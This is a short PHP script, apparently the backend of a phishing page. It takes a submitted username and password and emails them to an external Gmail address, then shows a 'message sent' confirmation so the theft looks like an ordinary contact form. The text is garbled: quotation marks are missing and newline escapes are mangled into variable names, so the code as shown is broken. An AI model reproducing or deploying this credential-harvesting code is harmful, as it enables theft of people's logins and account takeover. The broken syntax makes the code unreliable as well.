<?php

if ($_SERVER[REQUEST_METHOD] == POST) {

    $usuario = htmlspecialchars($_POST[usuario]);
    $password = htmlspecialchars($_POST[password]);
 

    $destino = mystic.oficial7@gmail.com;
    $asunto = Nuevo mensaje desde la web;

    $contenido = Usuario $usuarion;
    $contenido .= password $passwordn;


    $headers = From noreply@tuweb.com;

    mail($destino, $asunto, $contenido, $headers);

    echo Mensaje enviado correctamente;

} else {
    echo Acceso no permitido;
}

?>
